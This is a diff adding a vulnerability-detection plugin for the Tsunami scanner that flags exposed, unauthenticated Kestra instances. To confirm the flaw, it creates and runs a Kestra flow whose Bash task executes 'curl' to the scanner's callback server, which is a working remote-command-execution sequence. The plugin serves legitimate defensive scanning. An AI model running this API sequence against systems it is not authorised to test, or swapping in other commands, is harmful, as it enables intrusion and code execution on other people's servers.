@@ -1,0 +1,111 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Kestra_ExposedUI"
+  author: "lanceD00M"
+  version: "0.1"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "KESTRA_EXPOSED_UI"
+  }
+  title: "Exposed Kestra instance"
+  description: "Kestra instance is exposed and can be used to compromise the system."
+  recommendation:
+    "Configure authentication or ensure the Kestra instance is not exposed "
+    "to the network. See "
+    "https://kestra.io/docs/enterprise/auth/authentication for details."
+  severity: CRITICAL
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "kestra_exposed_ui_fingerprint"
+  http_request: {
+    method: GET
+    uri: "/api/v1/main/usages/all"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: { body {} contains: '"startUuid"' }
+        conditions: { body {} contains: '"instanceUuid"' }
+        conditions: { body {} contains: '"dailyStatistics"' }
+        conditions: { body {} contains: '"executions"' }
+        conditions: { body {} contains: '"queueType"' }
+        conditions: { body {} contains: '"configurations"' }
+        conditions: { body {} contains: '"flows"' }
+      }
+    }
+  }
+}
+
+actions: {
+  name: "create_tsunami_flow"
+  http_request: {
+    method: POST
+    uri: "/api/v1/main/flows"
+    headers: [
+      { name: "Content-Type" value: "application/x-yaml" }
+    ]
+    data: "id: tsunami_security_scanner\nnamespace: company.team\n\ntasks:\n  - id: bash\n    type: \"io.kestra.core.tasks.scripts.Bash\"\n    commands:\n      - \'curl {{ T_CBS_URI }}\'\n"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: { body {} contains: '"namespace"' }
+        conditions: { body {} contains: '"id":"tsunami_security_scanner"' }
+        conditions: { body {} contains: '"io.kestra.core.tasks.scripts.Bash"' }
+      }
+    }
+  }
+}
+
+actions: {
+  name: "execute_tsunami_flow"
+  http_request: {
+    method: POST
+    uri: "/api/v1/main/executions/company.team/tsunami_security_scanner"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: { body {} contains: '"flowId":"tsunami_security_scanner"' }
+        conditions: { body {} contains: '"namespace":"company.team"' }
+      }
+    }
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "kestra_exposed_ui_fingerprint",
+    "create_tsunami_flow",
+    "execute_tsunami_flow",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
